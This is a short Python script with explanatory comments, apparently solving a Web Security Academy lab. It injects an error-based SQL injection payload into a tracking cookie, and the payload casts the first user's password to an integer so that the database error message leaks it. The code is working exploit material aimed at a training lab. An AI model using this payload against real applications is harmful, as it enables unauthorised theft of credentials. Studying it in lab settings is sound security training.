import requests

URL = "https://0aff009603c972318542490b00a8006d.web-security-academy.net"
PATH = "/filter"
QUERY = {
    "category": "Gifts"
}

def displayRequestHeaders(request):
    print("\n")
    print("***** SENDING REQUEST ... *****")
    print("\n")
    print(f"{request.request.method} {PATH} HTTP / 1.1")
    print(f"Host: {URL}")
    for header, value in request.request.headers.items():
        print(f"{header}: {value}")
    print("\n")

def displayResponseHeaders(response):
    print("\n")
    print("***** RECEIVED RESPONSE ... *****")
    print("\n")
    print(f"Status: {response.status_code}")
    for header, value in response.headers.items():
        print(f"{header}: {value}")
    print("\n")

def makeRequest(url=URL, path=PATH, query=QUERY, cookie=None):    
    response = requests.request(
    "GET",
    f"{URL}{PATH}",
    params=QUERY,
    cookies=cookie
    )
    return response

res = makeRequest()
cookies = res.cookies
PAYLOAD = f"x' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"
modified_cookies = {"TrackingId":PAYLOAD,"session": cookies.get('session')}
session = makeRequest(cookie=modified_cookies)
displayRequestHeaders(session)
displayResponseHeaders(session)
print(session.text)

# I thought this lab was broken because it kept on giving same the error message:
# """Unterminated string literal started at position 95 in SQL SELECT * FROM tracking 
# WHERE id = 'jUp8oNzaKr4pzj9y' AND 1 = CAST((SELECT password FROM users L'. Expected  char"""
#
# It turns out, the error message it actually showing that the string is being truncated.
# To get around this small character limit, replace the original query parameter "TrackingId" with one character. 
#
# The point of this lab was to use the SQLi in a restricted way (no conditional errors or union statements).
# To add an aditional statement in the injection, we have to use the AND clause which expects a boolean value/expression
# To do this, we use the "1=" argument to evaluate a comparison value.
# We use the CAST function in the comparison to SELECT 1 user, 
# which will be the first user "administrator" and we CAST this as an INT datatype.
# Casting the text db entry to int will give an error but shows the value you tried to cast in the error :)
# This will leak the password 